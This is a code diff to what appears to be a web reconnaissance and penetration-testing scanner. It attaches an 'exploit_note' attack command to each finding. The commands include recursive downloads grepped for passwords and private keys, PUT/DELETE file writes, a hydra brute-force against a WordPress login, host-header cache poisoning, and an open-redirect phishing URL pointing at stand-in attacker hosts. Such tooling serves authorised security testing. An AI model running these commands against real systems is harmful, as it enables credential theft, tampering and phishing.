@@ -1460,7 +1460,9 @@ def enum_findings(host_ip: str, port: Port,
     for f in header_hygiene_findings(fp):
         out.append(_mk(
             host_ip, port, "http-header-hygiene", f["severity"], f["title"],
-            f["cwes"], f["output"], f["remediation"]))
+            f["cwes"], f["output"], f["remediation"],
+            exploit_note="curl -sSkI http://IP:PORT/ ; searchsploit nginx 1.18",
+            depth_tier="t0"))
     if fp:
         techs = list(fp.get("technologies") or [])
         if fp.get("generator"):
@@ -1541,7 +1543,11 @@ def enum_findings(host_ip: str, port: Port,
                 f"often reveals dumps, backups, and unlinked test scripts.",
                 "Apache: `Options -Indexes` in the vhost or .htaccess. "
                 "nginx: remove `autoindex on;` from the location block. "
-                "IIS: turn off Directory Browsing in Features View."))
+                "IIS: turn off Directory Browsing in Features View.",
+                exploit_note=(
+                    "wget -r -np -l 3 http://IP:PORT/backup/ && grep -Elr "
+                    "'password|secret|BEGIN.*PRIVATE KEY' ./IP:PORT/"),
+                depth_tier="t1"))
 
     # JavaScript secret scanning — pull <script src> from the root page,
     # fetch same-host bundles, grep for API keys / tokens / hardcoded URLs.
@@ -1602,7 +1608,12 @@ def enum_findings(host_ip: str, port: Port,
             f"{spec['kind']} spec reachable — approximately {spec['endpoint_count']} "
             f"endpoints/types described",
             f"If the API is internal, block {spec['path']} externally. "
-            f"Otherwise, ensure documented endpoints have appropriate authz."))
+            f"Otherwise, ensure documented endpoints have appropriate authz.",
+            exploit_note=(
+                "curl -sSk http://IP:PORT/openapi.json | jq '.paths | "
+                "keys[]' | head -40 ; for p in $(...); do curl -sSk -o "
+                "/dev/null -w '%{http_code} %{url}\\n' http://IP:PORT$p; done"),
+            depth_tier="t0"))
 
     # HTTP methods — TRACE with reflection = real XST, PUT/DELETE routed
     # anywhere = worth flagging.
@@ -1613,7 +1624,11 @@ def enum_findings(host_ip: str, port: Port,
             "HTTP TRACE method reflects request (XST)",
             ["CWE-693"],
             "TRACE request echoed User-Agent — confirmed Cross-Site Tracing",
-            "Disable the TRACE method (e.g. Apache: TraceEnable off; nginx: reject at directive)."))
+            "Disable the TRACE method (e.g. Apache: TraceEnable off; nginx: reject at directive).",
+            exploit_note=(
+                "curl -sSk -X TRACE -H 'X-Steal: canary' http://IP:PORT/ "
+                "| grep -i x-steal"),
+            depth_tier="t1"))
     dangerous = [m for m in ("PUT", "DELETE", "PATCH", "CONNECT", "PROPFIND")
                  if m in methods.get("accepted", [])]
     if dangerous:
@@ -1622,7 +1637,13 @@ def enum_findings(host_ip: str, port: Port,
             "Writable/tunneling HTTP methods accepted",
             ["CWE-650"],
             f"Server routes: {', '.join(dangerous)} (Allow header: {methods.get('allow_header','') or 'none'})",
-            "Restrict methods to GET/HEAD/POST for public endpoints; disable PUT/DELETE/PROPFIND unless the app truly needs them."))
+            "Restrict methods to GET/HEAD/POST for public endpoints; disable PUT/DELETE/PROPFIND unless the app truly needs them.",
+            exploit_note=(
+                "curl -sSk -X PUT --data 'recce-canary' "
+                "http://IP:PORT/recce_probe.txt ; curl -sSk "
+                "http://IP:PORT/recce_probe.txt ; curl -sSk -X DELETE "
+                "http://IP:PORT/recce_probe.txt"),
+            depth_tier="t0"))
 
     # C2: form / login discovery. Feed fp so default-cred hints reuse it.
     forms = discover_forms(host_ip, port.portid, use_tls, fp=fp if fp else None)
@@ -1642,7 +1663,12 @@ def enum_findings(host_ip: str, port: Port,
             f"HTML forms discovered: {summary}",
             [],
             summary + "\n" + "\n".join(detail_lines),
-            "Informational — feeds credential-spray candidate list and C5 SQLi targeting."))
+            "Informational — feeds credential-spray candidate list and C5 SQLi targeting.",
+            exploit_note=(
+                "RECCE_ACTIVE_ATTACKS=1 python -c 'from recce.services.sqli "
+                "import test_form; print(test_form(\"http://IP:PORT/login\","
+                "\"POST\",[\"user\",\"pass\"],active_attacks=True))'"),
+            depth_tier="t0"))
     # Emit one dedicated finding per login form that has default-cred candidates.
     for f in login_forms:
         if not f.get("default_creds"):
@@ -1657,7 +1683,11 @@ def enum_findings(host_ip: str, port: Port,
             f"(fields: user={f['username_field']!r}, pass={f['password_field']!r}, "
             f"csrf={'yes' if f['has_csrf'] else 'no'})",
             "Change or disable default credentials. If the app must stay reachable, "
-            "restrict it network-adjacent and force password reset on first login."))
+            "restrict it network-adjacent and force password reset on first login.",
+            exploit_note=(
+                "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP "
+                "http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:S=302' -f"),
+            depth_tier="t0"))
 
     # CORS misconfig — reflect origin + credentials = real cross-origin exfil.
     cors = cors_probe(host_ip, port.portid, use_tls)
@@ -1752,7 +1782,12 @@ def enum_findings(host_ip: str, port: Port,
                 f"Do not reflect {hit['header']} into response bodies or "
                 "location-family headers; validate against an allowlist of "
                 "expected hostnames; ensure cache key includes the "
-                "reflected header."))
+                "reflected header.",
+                exploit_note=(
+                    "curl -sSk -H 'X-Forwarded-Host: attacker.recce' -D- "
+                    "http://IP:PORT/ ; sleep 2 ; curl -sSk -D- "
+                    "http://IP:PORT/ | grep -Ei 'age:|x-cache|attacker'"),
+                depth_tier="t1"))
 
     # WebDAV method enum — PROPFIND against likely dir paths. A 207 confirms
     # the tree walks. Distinct from the generic methods_probe finding above
@@ -1770,7 +1805,13 @@ def enum_findings(host_ip: str, port: Port,
                 "attacker can walk the directory tree and (if PUT is also "
                 "routed) upload files.",
                 "Disable WebDAV on public endpoints (Apache: `Dav Off`; "
-                "IIS: remove WebDAV module; nginx: remove `dav_methods`)."))
+                "IIS: remove WebDAV module; nginx: remove `dav_methods`).",
+                exploit_note=(
+                    "curl -sSk -X PROPFIND -H 'Depth: 1' "
+                    "http://IP:PORT/webdav/ ; curl -sSk -X PUT --data 'x' "
+                    "http://IP:PORT/webdav/recce.txt && curl -sSk "
+                    "http://IP:PORT/webdav/recce.txt"),
+                depth_tier="t1"))
 
     # Open-redirect probe — enumerate a small (path, param) matrix. Any hit
     # whose Location leaks the external canary host is a real primitive.
@@ -1783,7 +1824,12 @@ def enum_findings(host_ip: str, port: Port,
             f"Location: {h['location']!r}. The parameter is not host-validated — "
             "feeds phishing chains and OAuth code-theft.",
             f"Validate the {h['param']} parameter against an allowlist of same-origin "
-            "paths; reject absolute URLs whose host differs from the canonical host."))
+            "paths; reject absolute URLs whose host differs from the canonical host.",
+            exploit_note=(
+                "curl -sSk -D- 'http://IP:PORT/login?next=https://"
+                "attacker.tld/x' | grep -i location ; craft phishing: "
+                "https://IP/login?next=https://phish.attacker.tld/o365"),
+            depth_tier="t1"))
 
     # CRLF header-injection probe — a single reflected header proves the split.
     crlf = crlf_injection_probe(host_ip, port.portid, use_tls)
